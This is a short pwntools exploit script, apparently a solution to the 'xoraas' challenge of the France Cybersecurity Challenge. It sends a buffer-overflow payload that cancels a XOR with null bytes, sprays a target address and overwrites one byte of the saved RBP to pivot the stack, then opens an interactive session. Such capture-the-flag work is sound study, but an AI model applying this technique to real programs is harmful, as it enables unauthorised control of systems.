#!/usr/bin/python3

from pwn import *

if args.REMOTE:
    p = remote("challenges.france-cybersecurity-challenge.fr", 2053)
else:
    p = process("./xoraas")

context.endian = "little"
addr = 0x401142

# we fill the first buffer[128] with 0x00 to neutralize the xor
# then we send our target address repeated 18 times to fill the second buffer[144]
# the last 0x00 will overwrite the last byte of RBP to point back higher on the stack
# hopefully in our addresses buffer
# the exploit works roughly 3/4 of the time, because sometimes rbp's second-to-last byte will not be the same than that of our payload

payload = b"\x00" * 128 + p64(addr) * 18 + b"\x80"

#open("payload", "wb").write(payload)
p.sendline(payload)
p.interactive()
